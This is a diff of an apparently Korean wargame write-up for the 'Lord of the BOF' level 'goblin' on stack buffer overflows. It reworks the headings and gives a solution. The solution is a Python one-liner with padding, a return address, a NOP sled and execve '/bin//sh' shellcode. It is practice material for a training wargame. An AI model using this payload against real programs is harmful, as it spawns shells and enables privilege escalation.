@@ -4,7 +4,8 @@ categories: [Wargame, BOF]
 tags: [stack buffer overflow]
 ---
 
-## 1. Source Code
+## goblin
+---
 ```c
 /*
         The Lord of the BOF : The Fellowship of the BOF
@@ -41,11 +42,13 @@ main(int argc, char *argv[])
         printf("%s\n", buffer);
 }
 ```
+<br>
+<br>
 
-## 2. Vulnerability
+## Solution
+---
 환경변수 대신에 ret 영역 이후의 부분을 이용할 거임.
 
-## 3. Solution
 컴파일해서 따로 test 실행파일을 만들어놓고 해본 뒤에 실제파일에 할꺼임.
 ```
  ./test `python -c 'print "A"*44+"\xbf\xbf\xbf\xbf"+"\x90"*100+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"'`
